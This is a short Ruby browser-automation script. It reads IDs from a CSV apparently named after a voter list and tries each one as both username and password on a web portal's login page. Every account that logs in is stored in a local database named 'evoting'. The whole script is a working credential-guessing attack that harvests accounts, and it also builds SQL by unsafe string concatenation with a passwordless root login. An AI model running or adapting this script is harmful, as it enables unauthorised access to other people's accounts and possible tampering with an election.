require 'watir' # Crawler
require 'pry' # Ruby REPL
require 'rb-readline' # Ruby IRB
require 'awesome_print' # Console output
require 'watir-scroll'
require 'net/http'
require 'uri'
require 'json'
require 'mysql2' #database

require 'csv'



# CSV.open("DPS PERTANIAN", "r") do |csv|
#     puts( csv )
# end




client = Mysql2::Client.new(:host => "localhost", :username => "root", :password =>"", :database =>"evoting" )
@@baseUrl = "http://192.168.0.55/"

@@ii = 0
begin
    @@browser = Watir::Browser.new :chrome
    @@ii += 1
end until @@ii > 2

sleep(200)
table = CSV.read("DPS PERTANIAN.csv")
puts( table.length )

table.each do |row|
    puts( row[0] )
    nim = row[0]
    pass = row[0]
    @@browser.goto @@baseUrl + "/index.php?exec=login"
    @@browser.text_field(:name => "NIP").set nim
    @@browser.text_field(:name => "password").set pass
    @@browser.input(:type => "submit" ).click 

    sleep(1)    
    if @@browser.table(:class => "main" ).exists?
        query = "INSERT INTO `users` (`id`, `nim`, `pass` ) VALUES ( NULL, " + "'#{nim}', " + "'#{pass}' "+ ")"
        puts( query )
        
        client.query(query)
        @@browser.link(:href => "ademik.php?logout=1" ).click
    end
    sleep(2)
end
sleep(500)
